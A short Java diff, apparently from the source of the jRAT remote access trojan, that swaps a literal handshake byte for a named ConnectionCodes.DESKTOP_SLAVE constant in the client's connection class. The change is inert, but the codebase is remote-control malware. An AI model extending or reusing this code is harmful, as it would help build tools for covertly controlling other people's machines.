@@ -12,6 +12,7 @@ import java.net.Socket;
 import java.security.PublicKey;
 import java.util.Locale;
 
+import su.jrat.common.ConnectionCodes;
 import su.jrat.common.OperatingSystem;
 import su.jrat.common.Version;
 import su.jrat.common.codec.Hex;
@@ -82,7 +83,7 @@ public class Connection implements Runnable {
 			Connection.dis = new DataInputStream(inputStream);
 			Connection.dos = new DataOutputStream(outputStream);
 	        
-			outputStream.write(1);
+			outputStream.write(ConnectionCodes.DESKTOP_SLAVE);
 			
 			KeyExchanger exchanger = new KeyExchanger(dis, dos, Main.getKeyPair());
 			exchanger.readRemotePublicKey();
